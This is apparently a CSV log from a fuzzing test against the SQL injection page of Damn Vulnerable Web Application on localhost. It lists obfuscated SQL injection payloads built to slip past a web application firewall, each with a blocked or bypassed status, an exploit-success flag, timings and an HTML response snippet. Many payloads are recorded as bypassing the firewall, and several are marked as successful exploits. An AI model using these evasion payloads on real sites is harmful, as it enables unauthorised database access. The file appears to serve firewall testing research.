Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@=.1%0b||+{`if`+1}=1%0blike+{x+(select+1)}=1--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0196,70.0,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor%0b!+{x%0b(select+1)}=1=%0b(!%0b{`if`+1}=1)+,Bypassed,No,None,Invalid,0.0392,70.52,No,500,
0%27<@=1.%0bor+!+{`if`+1}=1=+(not%0b{x+(select%0b1)}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0214,71.04,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+or+true%0blike%0b{x+(select%0b1)}=1--+,Blocked,No,None,Invalid,0.0163,71.04,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+or+not%0b{`if`%0b1}=1=+(!+{x+(select%0b1)}=1)%0b,Bypassed,No,None,Invalid,0.0346,71.21,No,500,
0%27<@!=1.+or%0bnot+1=+(!+{x+(select%0b1)}=1)%23,Blocked,No,None,Invalid,0.0421,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+or+!+1=+(!%0b{x+(select+1)}=1)+||%27,Bypassed,No,None,Invalid,0.0154,71.21,No,500,
0'<@!=1.+or+!+{x%0b(select%0b1)}=1=+(not+{a+1}=1)--,Bypassed,No,None,Invalid,0.0455,71.21,No,500,
0%27<@=1.+||+0=+(!+{a%0b1}=1)%0b||',Bypassed,No,None,Invalid,0.0426,71.21,No,500,
0'<@=1.%0bor+!+{`if`+1}=1=+(!%0btrue)+||',Bypassed,No,None,Invalid,0.0257,71.21,No,500,
0'<@=1%0bor+not+{x%0b(select%0b1)}=1=+(not%0b{x+(select+1)}=1),Bypassed,No,None,Invalid,0.0444,71.21,No,500,
0%27<@=.1%0bor+!+{`if`+1}=1=+(!%0b{a+1}=1)+or',Bypassed,No,None,Invalid,0.0248,71.21,No,500,
0'<@=1.%0b||+true+like+{x+(select%0b1)}=1--+,Bypassed,No,None,Invalid,0.0285,71.21,No,500,
0%27||%0b@<@.+or%0bnot%0b{a+1}=1=%0b(!%0b{`if`+1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0389,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+or+{x%0b(select+1)}=1%0blike%0btrue+or',Blocked,No,None,Invalid,0.034,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0bor+!%0b{`if`%0b1}=1=+(not%0b{x%0b(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0407,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor+not+{`if`+1}=1=+(not+{x+(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.023,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||%0bnot+{x+(select+1)}=1=+(not+{x+(select+1)}=1,Blocked,No,None,Invalid,0.0305,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1%0bor%0bnot+{x+(select+1)}=1=+(!%0b{x+(select%0b1)}=1,Bypassed,No,None,Invalid,0.02,71.21,No,500,
0'<@!=1%0bor%0bnot+{a%0b1}=1=+(!+{a+1}=1)+||',Bypassed,No,None,Invalid,0.0115,71.21,No,500,
0%27<@!=.1+or+{x+(select%0b1)}=1+like%0b{x%0b(select+1)}=1+or%27,Blocked,No,None,Invalid,0.0143,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+or%0b!%7efalse=%0b(not+{x+(select%0b1)}=1)%0b||',Blocked,No,None,Invalid,0.0337,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+or%0bnot%0b{x+(select%0b1)}=1=+(not%7efalse)%0bor',Blocked,No,None,Invalid,0.021,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1%0b||%0b{a%0b1}=1%0blike+{x%0b(select%0b1)}=1%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0481,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or+{`if`+1}=1%0blike+{a+1}=1%0bor%27,Bypassed,No,None,Invalid,0.0148,71.21,No,500,
0'<@!=1+||%0b!%7efalse=%0b(not%0b{`if`%0b1}=1)%23,Blocked,No,None,Invalid,0.014,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+or+not~0=%0b(!+{a%0b1}=1)+||%27,Bypassed,No,None,Invalid,0.0279,71.21,No,500,
0'<@!=1.+||%0bnot+{`if`+1}=1=%0b(!+{a+1}=1)%0b||%27,Bypassed,No,None,Invalid,0.029,71.21,No,500,
0'<@=1.%0b||%0bnot%7efalse=+(not+{a+1}=1)+or',Bypassed,No,None,Invalid,0.016,71.21,No,500,
0'<@=1.%0bor+!%0b{x%0b(select+1)}=1=+(!%0b{`if`%0b1}=1)+,Bypassed,No,None,Invalid,0.036,71.21,No,500,
0'<@!=1%0b||%0bnot%0b{x+(select+1)}=1=+(not~false)%23,Bypassed,No,None,Invalid,0.0206,71.21,No,500,
0'||%0b!@<@.+or+not%0b{a%0b1}=1=+(0)%0bor%27,Bypassed,No,None,Invalid,0.0175,71.21,No,500,
0%27<@!=.1%0b||+not+{x+(select+1)}=1=%0b(not+{`if`+1}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0153,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+1+like%0b{x+(select%0b1)}=1%23,Bypassed,No,None,Invalid,0.0289,71.21,No,500,
0'<@=.1+or+0=%0b(not%0b1)+||',Bypassed,No,None,Invalid,0.0364,71.21,No,500,
0%27<@=1.%0b||%0b!+{x%0b(select%0b1)}=1=+(not%7e0)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0288,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or+not+{a%0b1}=1=%0b(!%0btrue)+||',Bypassed,No,None,Invalid,0.0331,71.42,No,500,
0'<@!=.1+||+not+{`if`%0b1}=1=+(not+{`if`+1}=1)+or',Bypassed,No,None,Invalid,0.0409,71.63,No,500,
0'<@=1.%0b||+not%0b{x+(select%0b1)}=1=+(!+true)+or%27,Bypassed,No,None,Invalid,0.0568,71.63,No,500,
0'<@=.1+||+!+{x+(select%0b1)}=1=+(not%0b{x+(select+1)}=1),Blocked,No,None,Invalid,0.0232,71.63,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+or+not+true=%0b(!+1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0232,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+||%0b!+true=+(not%0b{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Invalid,0.022,71.63,No,500,
0%27<@!=1.%0bor+not%0b{`if`+1}=1=+(!%0btrue)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0212,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+!+{`if`+1}=1=%0b(!%7e0)+or',Bypassed,No,None,Invalid,0.0459,71.63,No,500,
0%27<@=1.+||+not+{a+1}=1=+(not+{x+(select+1)}=1)+,Blocked,No,None,Invalid,0.0209,71.63,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1%0b||%0bnot%0b{a%0b1}=1=+(!+{a%0b1}=1)+or',Bypassed,No,None,Invalid,0.0403,71.63,No,500,
0%27<@=.1+||+not~false=+(!+{x+(select%0b1)}=1)+||',Blocked,No,None,Invalid,0.0473,71.63,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.%0bor+!%0b1=+(!%0b{x+(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0434,71.63,No,500,
0'<@=.1+||%0b{a+1}=1%0blike+true+||%27,Bypassed,No,None,Invalid,0.0337,69.53,No,500,
0%27<@=1+||+!%0b{x+(select%0b1)}=1=+(not+1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0209,70.0,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||%0bnot%0b{x%0b(select+1)}=1=+(not+{x+(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0242,70.0,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27||%0b@<@.+||%0bnot~false=%0b(0)+or',Bypassed,No,None,Invalid,0.0341,71.04,No,500,
0'<@=.1+||%0b!%7e0=%0b(!+{a%0b1}=1)%0b||%27,Bypassed,No,None,Invalid,0.028,71.1,No,500,
0'<@=.1%0bor%0b!+{x%0b(select%0b1)}=1=+(!%0b{x+(select+1)}=1),Bypassed,No,None,Invalid,0.0561,71.21,No,500,
0'<@=.1%0bor%0b!+{x+(select%0b1)}=1=%0b(!+{a+1}=1)+,Bypassed,No,None,Invalid,0.048,71.21,No,500,
0'<@=.1+or+!%0btrue=%0b(not+{x%0b(select%0b1)}=1)+||%27,Bypassed,No,None,Invalid,0.0293,71.21,No,500,
0%27<@=1.%0bor+!+{a+1}=1=+(false)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0375,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||%0bnot%0btrue=+(!+{x+(select+1)}=1)+||%27,Blocked,No,None,Invalid,0.0214,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+||%0bnot+{x+(select+1)}=1=+(!+{x+(select%0b1)}=1),Blocked,No,None,Invalid,0.0215,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1%0bor%0bnot+{x%0b(select%0b1)}=1=+(not%0b{x%0b(select+1)}=1),Bypassed,No,None,Invalid,0.0283,71.21,No,500,
0'<@=.1+||%0bnot%0b{`if`+1}=1=+(not+{a+1}=1)+or%27,Bypassed,No,None,Invalid,0.0313,71.21,No,500,
0%27<@=1%0bor+!+true=+(!%0btrue)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0505,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0b||+not+{x%0b(select+1)}=1=+(not+{x%0b(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0106,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or+{x%0b(select+1)}=1%0blike%0b{a+1}=1+or',Bypassed,No,None,Invalid,0.0255,71.21,No,500,
0%27<@!=1+||+!%0b{x%0b(select%0b1)}=1=%0b(not+{x+(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0368,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0bor+!+{x%0b(select+1)}=1=+(not+{`if`+1}=1)%0b,Bypassed,No,None,Invalid,0.0262,71.21,No,500,
0%27<@!=1%0bor%0b!%0b{`if`+1}=1=+(!%0btrue)%0b||',Bypassed,No,None,Invalid,0.0154,71.21,No,500,
0'<@=.1+||%0b!%0b{x+(select%0b1)}=1=%0b(false)%23,Blocked,No,None,Invalid,0.0362,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.%0b||%0b{`if`%0b1}=1%0blike+{x+(select%0b1)}=1+or%27,Bypassed,No,None,Invalid,0.0393,71.21,No,500,
0%27<@!=.1%0b||+!%0b1=+(not%0b{a%0b1}=1)+||',Bypassed,No,None,Invalid,0.0357,71.21,No,500,
0'<@=.1+or+{a%0b1}=1+like+1%0b||',Blocked,No,None,Invalid,0.0079,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+||%0b!+1=%0b(not%0b{x%0b(select+1)}=1)--+,Bypassed,No,None,Invalid,0.0298,71.21,No,500,
0%27<@=.1+or+!%7efalse=%0b(!%0b1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0314,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0b||%0b!~false=%0b(!+{`if`+1}=1)+or',Bypassed,No,None,Invalid,0.0227,71.21,No,500,
0'<@=1.%0b||+not%0b{x%0b(select%0b1)}=1=%0b(!+{a+1}=1)+,Bypassed,No,None,Invalid,0.0438,71.21,No,500,
0%27<@!=.1%0b||+false=%0b(!+{`if`+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0468,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+!+{a+1}=1=+(false)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0155,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||+!%0b{x+(select+1)}=1=%0b(not+{`if`%0b1}=1)%0b,Bypassed,No,None,Invalid,0.0314,71.21,No,500,
0%27<@=.1+or%0bnot+{`if`%0b1}=1=+(!+{`if`+1}=1)+||',Bypassed,No,None,Invalid,0.0233,71.21,No,500,
0%27<@!=1+||+!%0b{`if`%0b1}=1=+(!%0b{x%0b(select%0b1)}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0418,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27or+1<@.%0bor%0b{x+(select+1)}=1+like%0b{`if`+1}=1+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0382,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||%0b1%0blike%0b{a%0b1}=1+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0306,71.26,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0bor+not%0b{a%0b1}=1=+(false)+||%27,Bypassed,No,None,Invalid,0.0196,71.63,No,500,
0'<@=1.%0bor+not%0b{a%0b1}=1=%0b(!+{x+(select+1)}=1)--,Bypassed,No,None,Invalid,0.0294,71.63,No,500,
0'<@=.1+||+not+{a+1}=1=+(!%0b{a+1}=1)+||',Bypassed,No,None,Invalid,0.0325,71.63,No,500,
0'<@!=1%0bor+not+{x+(select+1)}=1=%0b(!+{x+(select+1)}=1),Bypassed,No,None,Invalid,0.0398,71.63,No,500,
0%27<@!=1.%0bor+{x+(select+1)}=1%0blike%0b{x+(select+1)}=1+or',Bypassed,No,None,Invalid,0.0299,71.63,No,500,
0%27<@!=1.%0bor%0b!%0b1=+(not~0)+or',Bypassed,No,None,Invalid,0.0124,71.63,No,500,
0'<@=1+||+not+{`if`+1}=1=%0b(0)%0b||%27,Bypassed,No,None,Invalid,0.0223,71.63,No,500,
